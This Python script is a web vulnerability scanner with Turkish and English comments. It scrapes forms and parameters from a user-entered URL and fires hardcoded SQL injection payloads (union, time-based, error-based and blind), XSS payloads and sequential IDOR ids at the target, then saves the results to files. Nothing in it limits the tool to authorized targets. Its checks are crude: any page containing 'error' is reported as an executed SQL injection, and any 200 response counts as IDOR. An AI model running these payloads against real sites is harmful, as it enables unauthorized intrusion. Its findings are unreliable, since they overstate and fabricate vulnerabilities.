import json
import csv
import os
import requests
from urllib.parse import urlparse, parse_qs, urljoin
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
from bs4 import BeautifulSoup

#! 📌 GET Parametrelerini Çekme Fonksiyonu
#! 📌 GET Parameters Extraction Function
def url_parametreleri_cek(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    param_listesi = []
    
    #$ Parametreleri kontrol et
    #$ Check parameters
    if query_params:
        for param, value in query_params.items():
            param_listesi.append({'parametre': param, 'deger': value[0]})  # Her parametre sadece bir değeri alır
    else:
        param_listesi.append({'parametre': 'No parameters found', 'deger': ''})
    
    return param_listesi

#£ 📌 Form Verilerini Çekme Fonksiyonu
#£ 📌 Form Data Extraction Function
def form_verisi_olustur(form):
    form_data = {
        'action': form.get('action'),
        'method': form.get('method'),
        'inputs': [],
        'textareas': []
    }

    inputs = form.find_all('input')
    for input_tag in inputs:
        input_data = {
            'name': input_tag.get('name'),
            'type': input_tag.get('type'),
            'placeholder': input_tag.get('placeholder')
        }
        form_data['inputs'].append(input_data)

    textareas = form.find_all('textarea')
    for textarea in textareas:
        textarea_data = {
            'name': textarea.get('name'),
            'placeholder': textarea.get('placeholder')
        }
        form_data['textareas'].append(textarea_data)
    
    return form_data

#£ 📌 Verileri TXT Olarak Kaydetme
#£ 📌 Saving Data as TXT
def veri_kaydet_txt(form_data, param_data, sqli_results, xss_results, idor_results, folder_path):
    with open(os.path.join(folder_path, "veriler.txt"), 'a', encoding='utf-8') as file:
        file.write("=== FORMS ===\n")
        for form in form_data:
            file.write(f"Form Action: {form['action']}\n")
            file.write(f"Form Method: {form['method']}\n")
            for input_tag in form['inputs']:
                file.write(f"Input Name: {input_tag['name']}, Type: {input_tag['type']}, Placeholder: {input_tag['placeholder']}\n")
            for textarea_tag in form['textareas']:
                file.write(f"Textarea Name: {textarea_tag['name']}, Placeholder: {textarea_tag['placeholder']}\n")
            file.write("\n" + "-"*20 + "\n")

        file.write("\n=== URL PARAMETERS ===\n")
        for param in param_data:
            file.write(f"Parameter: {param['parametre']}, Value: {param['deger']}\n")
        file.write("\n" + "="*30 + "\n")

        file.write("\n=== SQLi RESULTS ===\n")
        for result in sqli_results:
            file.write(result + "\n")
        file.write("\n" + "="*30 + "\n")

        file.write("\n=== XSS RESULTS ===\n")
        for result in xss_results:
            file.write(result + "\n")
        file.write("\n" + "="*30 + "\n")

        file.write("\n=== IDOR RESULTS ===\n")
        for result in idor_results:
            file.write(result + "\n")
        file.write("\n" + "="*30 + "\n")

#£ 📌 Verileri JSON Olarak Kaydetme
#£ 📌 Saving Data as JSON
def veri_kaydet_json(form_data, param_data, sqli_results, xss_results, idor_results, folder_path):
    data = {
        'forms': form_data,
        'parameters': param_data,
        'sqli_results': sqli_results,
        'xss_results': xss_results,
        'idor_results': idor_results
    }
    with open(os.path.join(folder_path, "veriler.json"), 'w', encoding='utf-8') as file:
        json.dump(data, file, indent=4, ensure_ascii=False)

#£ 📌 Verileri CSV Olarak Kaydetme
#£ 📌 Saving Data as CSV
def veri_kaydet_csv(form_data, param_data, sqli_results, xss_results, idor_results, folder_path):
    with open(os.path.join(folder_path, "veriler.csv"), 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(['Data Type', 'Form Action', 'Form Method', 'Input Name', 'Input Type', 'Input Placeholder', 'Textarea Name', 'Textarea Placeholder', 'URL Parameter', 'Parameter Value', 'Result'])

        for form in form_data:
            for input_tag in form['inputs']:
                writer.writerow(['Form', form['action'], form['method'], input_tag['name'], input_tag['type'], input_tag['placeholder'], '', '', '', '', ''])
            for textarea_tag in form['textareas']:
                writer.writerow(['Form', form['action'], form['method'], '', '', '', textarea_tag['name'], textarea_tag['placeholder'], '', '', ''])

        for param in param_data:
            writer.writerow(['URL Parameter', '', '', '', '', '', '', '', param['parametre'], param['deger'], ''])

        for result in sqli_results:
            writer.writerow(['SQLi Result', '', '', '', '', '', '', '', '', '', result])

        for result in xss_results:
            writer.writerow(['XSS Result', '', '', '', '', '', '', '', '', '', result])

        for result in idor_results:
            writer.writerow(['IDOR Result', '', '', '', '', '', '', '', '', '', result])

#£ 📌 Kullanıcıdan Kaydetme Seçeneklerini Alma
#£ 📌 Getting Save Options from User
def dosya_secim():
    folder_name = input("Enter the folder name where you want to save (e.g., 'data'): ")

    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
        print(f"Folder named {folder_name} has been created.")

    file_formats = input("In which formats would you like to save? (txt, json, csv) - To select multiple formats, separate with commas: ").lower()
    file_formats = [fmt.strip() for fmt in file_formats.split(',')]

    return folder_name, file_formats

#£ 📌 SQLi Payloads
def sqli_payloads():
    return [
        "' OR '1'='1", "' OR 1=1 --", '" OR "1"="1', "' UNION SELECT null,null,null --",
        "admin' --", "' OR 'a'='a", "' AND 1=1 --", "' AND 1=2 --", "' OR 1=1 LIMIT 1 --",
        "' AND 1=1", "' AND 1=2", "' AND 1=0", "' AND 1=1 ORDER BY 1 --", "' AND 1=1 ORDER BY 100 --",
        "' OR IF(1=1, SLEEP(5), 0) --", "' OR IF(1=2, SLEEP(5), 0) --", "'; WAITFOR DELAY '0:0:5' --",
        "' UNION SELECT NULL, NULL, NULL --", "' UNION SELECT 1, user(), database() --", 
        "' UNION SELECT 1,2,3,4 --",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') --",
        "' OR 1=1 AND UPDATEXML(1, CONCAT(0x3c736563, user(), 0x3e), 1) --",
        "1' AND LENGTH(database()) > 0 --", "1' AND SUBSTRING(database(), 1, 1) = 'm' --"
    ]

#£ 📌 URL'yi Test Etme (SQLi)
#£ 📌 Testing the URL (SQLi)
def test_sqli_on_url(url, payloads):
    results = []
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        
        if "error" in response.text.lower() or response.status_code == 500:
            results.append(f"SQLi vulnerability detected and successfully executed: {test_url}")
    
    if not results:
        results.append("No SQLi vulnerability detected.")
    
    return results

#£ 📌 XSS Payloads
def xss_payloads():
    return [
        '<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>', '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>', '"><img src=x onerror=alert("XSS")>', '"><svg onload=alert("XSS")>'
    ]

#£ 📌 URL'de XSS Testi Yapma
#£ 📌 XSS Testing in URL
def test_xss_on_url(url, payloads):
    results = []
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        
        if payload in response.text:
            results.append(f"XSS vulnerability detected: {test_url}")
    
    if not results:
        results.append("No XSS vulnerability detected.")
    
    return results

#£ 📌 Formlarda XSS Testi Yapma
#£ 📌 XSS Testing on Forms
def test_xss_on_forms(base_url, forms, payloads):
    results = []
    for form in forms:
        action = form.get('action')
        if not action.startswith(('http://', 'https://')): 
            action = urljoin(base_url, action)
        method = form.get('method', 'get').lower()
        for payload in payloads:
            data = {}
            for input_tag in form.find_all('input'):
                if input_tag.get('name'):
                    data[input_tag.get('name')] = payload
            
            if method == 'post':
                response = requests.post(action, data=data)
            else:
                response = requests.get(action, params=data)
            
            if payload in response.text:
                results.append(f"XSS vulnerability detected: {action} with payload {payload}")
    
    if not results:
        results.append("No XSS vulnerability detected.")
    
    return results

#£ 📌 IDOR Payloads
def idor_payloads():
    return [
        "1", "2", "3", "4", "5", "10", "100", "1000"
    ]

#£ 📌 URL'de IDOR Testi Yapma
#£ 📌 IDOR Testing in URL
def test_idor_on_url(url, payloads):
    results = []
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        
        if response.status_code == 200 and "unauthorized" not in response.text.lower():
            results.append(f"IDOR vulnerability detected: {test_url}")
    
    if not results:
        results.append("No IDOR vulnerability detected.")
    
    return results

#£ 📌 URL ve Form Verilerini Çekme ve Test Etme
#£ 📌 Pulling and Testing URL and Form Data
def url_al():
    url = input("Enter the desired URL. || Type 'q' to quit. \n")
    
    if url == 'q':
        print("Exiting...")
        return
    else:
        url = url if url.startswith(("http://", "https://")) else "https://" + url  
        url = url if "www." in url else url.replace("https://", "https://www.")
        
        print("URL reached")
        
        try:
            html = urlopen(url).read()
        except (URLError, HTTPError) as e: 
            print("Could not reach the site:", e)
            return

        soup = BeautifulSoup(html, 'html.parser')
        
        forms = soup.find_all('form')
        form_data_list = []
        
        for form in forms:
            form_data = form_verisi_olustur(form)
            form_data_list.append(form_data)

        print("\nAnalyzing GET Parameters...")
        param_data_list = url_parametreleri_cek(url)
        
        print("Forms and URL parameters detected!")

        #£ 📌 SQLi Testi Yap
        #£ 📌 SQLi Test
        print("\nPerforming SQL Injection tests...")
        sqli_payloads_list = sqli_payloads()
        sqli_results = test_sqli_on_url(url, sqli_payloads_list)

        #£ 📌 XSS Testi Yap
        #£ 📌 XSS Test
        print("\nPerforming XSS tests...")
        xss_payloads_list = xss_payloads()
        xss_results = test_xss_on_url(url, xss_payloads_list)
        
        #£ 📌 Formlarda XSS Testi Yap
        #£ 📌 Test XSS on Forms
        print("\nPerforming XSS tests on forms...")
        xss_results += test_xss_on_forms(url, forms, xss_payloads_list)
        
        #£ 📌 IDOR Testi Yap
        #£ 📌 IDOR Test
        print("\nPerforming IDOR tests...")
        idor_payloads_list = idor_payloads()
        idor_results = test_idor_on_url(url, idor_payloads_list)

        #£ 📌 Kullanıcıdan Kaydetme Seçeneğini Al
        #£ 📌 Get User's Save Option
        folder_path, formats = dosya_secim()

        #£ 📌 Verileri Kaydet
        #£ 📌 Save Data
        if 'txt' in formats:
            veri_kaydet_txt(form_data_list, param_data_list, sqli_results, xss_results, idor_results, folder_path)
        
        if 'json' in formats:
            veri_kaydet_json(form_data_list, param_data_list, sqli_results, xss_results, idor_results, folder_path)
        
        if 'csv' in formats:
            veri_kaydet_csv(form_data_list, param_data_list, sqli_results, xss_results, idor_results, folder_path)

        print(f"Data saved successfully in the {folder_path} folder.")
